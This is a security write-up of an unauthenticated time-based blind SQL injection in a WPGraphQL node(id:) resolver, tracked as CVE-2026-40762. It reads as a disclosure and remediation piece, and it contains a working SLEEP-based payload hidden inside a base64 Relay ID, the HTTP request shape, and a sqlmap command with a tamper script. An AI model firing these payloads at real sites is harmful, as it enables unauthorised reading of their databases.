> Write-up · SQL injection (CWE-89) · CVE-2026-40762 · July 2026

## Summary

An unauthenticated, time-based blind SQL injection was confirmed in a public WPGraphQL `node(id:)` resolver affected by CVE-2026-40762. The injectable value is the base64 Relay global ID: when it decodes to a `user:<value>` identifier, the attacker-controlled `<value>` reaches the WordPress/WPGraphQL user-loader SQL path and is evaluated inside a MySQL query.

That gives a remote attacker a timing oracle to read database metadata bit by bit, with no authentication at all. Enumeration in the report was deliberately limited to schema names — no rows, credentials or PII were pulled. Host and program are redacted throughout.

## Why the global ID is the sink

WPGraphQL uses Relay-style opaque IDs: a base64 string that decodes to `type:id`, for example `user:123`.

The resolver decoded the client-supplied ID and passed the `id` portion toward a user lookup without sufficient sanitisation, so a decoded value like `user:0) OR (… )-- -` broke out of the intended query. Because the payload is wrapped in base64 inside a normal-looking GraphQL variable, it also slips past naive request inspection — the malicious SQL only exists after the server decodes it.

## Proof of concept

The proof is a decoded payload that forces a measurable delay, carried inside the base64 ID.

Decoded Relay ID (conceptually):

```text
user:0) OR (SELECT 1 FROM (SELECT SLEEP(2))X)-- <nonce>
```

That string is base64-encoded and sent as the `node(id:)` argument:

```http
POST /blog/graphql/ HTTP/2
Host: [REDACTED-HOST]
Content-Type: application/json

{"query":"{ node(id:\"<base64-of-the-payload>\"){ __typename ... on User { databaseId } } }"}
```

A valid-but-injected request returns `200 OK` after ~2 seconds; the same payload with `SLEEP(0)` returns immediately. Repeating both a few times gives a clean signal:

| Round | `SLEEP(0)` | `SLEEP(2)` | Delta |
| --- | ---: | ---: | ---: |
| 1 | 0.59s | 2.56s | 1.97s |
| 2 | 0.54s | 2.58s | 2.04s |
| 3 | 0.53s | 2.47s | 1.94s |

A consistent ~2-second delta that tracks the `SLEEP` argument is the confirmation — the database is executing attacker-supplied SQL.

## Automating the oracle

sqlmap confirms and extends the finding, but the payload has to be base64-wrapped to reach the sink, so it needs a small tamper script that rebuilds the `user:0) … -- nonce` wrapper and base64-encodes it before each request.

The run is kept gentle on purpose — time-based technique only, single-threaded, a delay between requests — because a blind oracle against production should prioritise not disrupting the target:

```bash
sqlmap -u "https://[REDACTED-HOST]/blog/graphql/" --method=POST \
  --data='{"query":"{ node(id:\"*\"){ __typename ... on User { databaseId } } }"}' \
  --headers="Content-Type: application/json" \
  --tamper=wpgraphql_b64.py \
  --dbms=MySQL --technique=T --time-sec=8 \
  --threads=1 --delay=1 --batch --dbs
```

sqlmap confirmed MySQL time-based blind injection and enumerated the visible schema names from `information_schema.schemata`.

## Impact and takeaways

Unauthenticated database read access on a public endpoint is high severity — the CVE carries CVSS 9.1 — even when the proof stops at schema names.

The report scoped the demonstration responsibly: it proved the oracle and read metadata, but did not extract table rows, credentials or PII, and made no RCE claim. For me the lessons are two. First, opaque IDs are not a security boundary — decoding user input and feeding it to a query is still injection, base64 or not. Second, the fix is the same as it has always been for SQLi: parameterised queries, so no amount of crafted `id` can change the query's structure. Keeping the destructive-potential PoC minimal and non-disruptive is what makes a finding like this safe to demonstrate on a live target.

---

Based on a LogicalBreach Academy write-up (author pyus3r). Read the original at [academy.logicalbreach.com](https://academy.logicalbreach.com/resources?tab=writeups).
